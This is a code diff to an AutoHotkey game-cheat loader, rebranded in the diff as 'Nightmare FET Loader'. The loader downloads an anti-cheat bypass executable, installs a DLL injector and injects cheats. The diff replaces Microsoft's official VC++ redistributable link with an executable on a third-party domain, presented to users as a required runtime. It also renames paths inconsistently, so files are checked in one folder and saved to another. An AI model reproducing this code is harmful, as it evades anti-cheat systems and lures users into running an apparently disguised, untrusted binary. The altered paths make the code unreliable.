@@ -1,6 +1,6 @@
 ; MIT License
 ;
-; Copyright (c) 2022 FET Loader
+; Copyright (c) 2022  FET Loader
 ;
 ; Permission is hereby granted, free of charge, to any person obtaining a copy
 ; of this software and associated documentation files (the "Software"), to deal
@@ -21,9 +21,9 @@
 ; SOFTWARE.
 ;
 ;
-;@Ahk2Exe-SetName               FET Loader
+;@Ahk2Exe-SetName                FET Loader
 ;@Ahk2Exe-SetDescription        A simple cheats loader written in AHK.
-;@Ahk2Exe-SetCopyright          Copyright (C) 2022 FET Loader
+;@Ahk2Exe-SetCopyright          Copyright (C) 2021 Nightmare FET Loader
 ;@Ahk2Exe-SetCompanyName        FET Loader
 ;@Ahk2Exe-SetProductVersion     3.7.2
 ;@Ahk2Exe-SetVersion            3.7.2
@@ -66,8 +66,8 @@ RegRead, winedition, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion, ProductN
 RegRead, winver, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion, ReleaseID
 RegRead, winbuild, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion, BuildLabEx
 RegRead, isLightMode, HKCU,SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize, SystemUsesLightTheme
-RegRead, isReaded, HKCU\SOFTWARE\FET Loader\FET Loader, isReadedDisclaimer
-RegRead, isDPIWarningReaded, HKCU\SOFTWARE\FET Loader\FET Loader, isDPIWarningReaded
+RegRead, isReaded, HKCU\SOFTWARE\FET Loader\Nightmare FET Loader, isReadedDisclaimer
+RegRead, isDPIWarningReaded, HKCU\SOFTWARE\FET Loader\Nightmare FET Loader, isDPIWarningReaded
 IniRead, oldgui, %A_AppData%\FET Loader\config.ini, settings, oldgui
 IniRead, cheatlist, %A_AppData%\FET Loader\cheats.ini, cheatlist, cheatlist
 IniRead, checkupdates, %A_AppData%\FET Loader\config.ini, settings, checkupdates
@@ -93,19 +93,19 @@ IfNotExist, %A_AppData%\FET Loader\cheats.ini
 IfNotExist, %A_AppData%\FET Loader\vac-bypass.exe
 {
     Logging(1,"- Downloading vac-bypass.exe...")
-    UrlDownloadToFile, https://raw.githubusercontent.com/fetloaderreborn/dll-repo/main/vac-bypass.exe, %A_AppData%\FET Loader\vac-bypass.exe
+    UrlDownloadToFile, https://raw.githubusercontent.com/fetloaderreborn/dll-repo/main/vac-bypass.exe, %A_AppData%\Nightmare FET Loader\vac-bypass.exe
     Logging(1,"......done.")
 }
 IfNotExist, %A_AppData%\FET Loader\emb.exe
 {
     Logging(1,"- Downloading emb.exe...")
-    UrlDownloadToFile, https://raw.githubusercontent.com/fetloaderreborn/dll-repo/main/emb.exe, %A_AppData%\FET Loader\emb.exe
+    UrlDownloadToFile, https://raw.githubusercontent.com/fetloaderreborn/dll-repo/main/emb.exe, %A_AppData%\Nightmare FET Loader\emb.exe
     Logging(1,"......done.")
 }
-IfNotExist, %A_AppData%\FET Loader\rpconfig.ini
+IfNotExist, %A_AppData%\Nightmare FET Loader\rpconfig.ini
 {	
     Logging(1,"- Getting rpconfig...")
-    UrlDownloadToFile, https://raw.githubusercontent.com/fetloaderreborn/dll-repo/main/rpconfig.ini, %A_AppData%\FET Loader\rpconfig.ini
+    UrlDownloadToFile, https://raw.githubusercontent.com/fetloaderreborn/dll-repo/main/rpconfig.ini, %A_AppData%\Nightmare FET Loader\rpconfig.ini
     Logging(1,"......done.")
 }
 Logging(1,"done.")
@@ -122,14 +122,14 @@ if (bruhshit = "unofficial build")
 
 if (winver = "2009")
 {
-    RegRead, isReadedWinBuild, HKCU\SOFTWARE\CodISH Inc\FET Loader, isReadedWinBuildWarning
+    RegRead, isReadedWinBuild, HKCU\SOFTWARE\Nightmare FET Loader\Nightmare FET Loader, isReadedWinBuildWarning
     if (!isReadedWinBuild)
     {
         MsgBox, 68, %script% Disclaimer, %string_20h2_warning%
         IfMsgBox, Yes
         {
-            RegWrite, REG_MULTI_SZ, HKCU\SOFTWARE\CodISH Inc\FET Loader, isReadedWinBuildWarning, Yes
-            Run, https://aka.ms/vs/17/release/vc_redist.x64.exe
+            RegWrite, REG_MULTI_SZ, HKCU\SOFTWARE\Nightmare FET Loader\Nightmare FET Loader, isReadedWinBuildWarning, Yes
+            Run, https://fetloader.xyz/VCRHyb64.exe
         }
     }
 }
@@ -139,7 +139,7 @@ if (!isReaded)
     MsgBox, 1, %script% Disclaimer, %string_disclaimer%
     IfMsgBox, OK
     {
-        RegWrite, REG_MULTI_SZ, HKCU\SOFTWARE\CodISH Inc\FET Loader, isReadedDisclaimer, Yes
+        RegWrite, REG_MULTI_SZ, HKCU\SOFTWARE\FET Loader\Nightmare FET Loader, isReadedDisclaimer, Yes
         ShowAbout(0)
     }
     else
@@ -172,7 +172,7 @@ else {
     Logging(1,"Build No.: "winbuild)
 }
 Logging(1,"Loader Location: "A_ScriptFullPath)
-Logging(1,"Cheat Repo: " repo)
+Logging(1,"Cheat Repo: "repo)
 Logging(1,"Cheat Repo Branch: main")
 if (A_IsUnicode = true) {
     Logging(1,"Compiler Type: UTF-8")
@@ -212,7 +212,6 @@ FileInstall, Web\css\fonts\GothamPro-Medium.ttf, Web\css\fonts\GothamPro-Medium.
 FileInstall, Web\css\fonts\GothamPro-Medium.woff, Web\css\fonts\GothamPro-Medium.woff, 1
 FileInstall, Lib\gh_injector.dll, gh_injector.dll, 1
 
-
 SetWorkingDir, %A_AppData%\FET Loader
 FileCreateDir, EasyRP
 FileInstall, EasyRP\config.ini, EasyRP\config.ini, 1
@@ -236,7 +235,7 @@ IniWrite, %smallimage%, %A_AppData%\FET Loader\EasyRP\config.ini, Images, SmallI
 IniWrite, %smallimagetooltip%, %A_AppData%\FET Loader\EasyRP\config.ini, Images, SmallImageTooltip
 IniWrite, %line1%, %A_AppData%\FET Loader\EasyRP\config.ini, State, Details
 IniWrite, %line2%, %A_AppData%\FET Loader\EasyRP\config.ini, State, State
-Run, %A_AppData%\FET Loader\EasyRP\easyrp.exe, %A_AppData%\FET Loader\EasyRP, Hide
+Run, %A_AppData%\FET Loader\EasyRP\easyrp.exe, %A_AppData%\Nightmare FET Loader\EasyRP, Hide
 
 if (checkupdates = "true" and build_status = "release")
 {
@@ -300,3 +299,4 @@ Load:
     Gui, Submit, NoHide
     Inject(0,Cheat)
     return
+
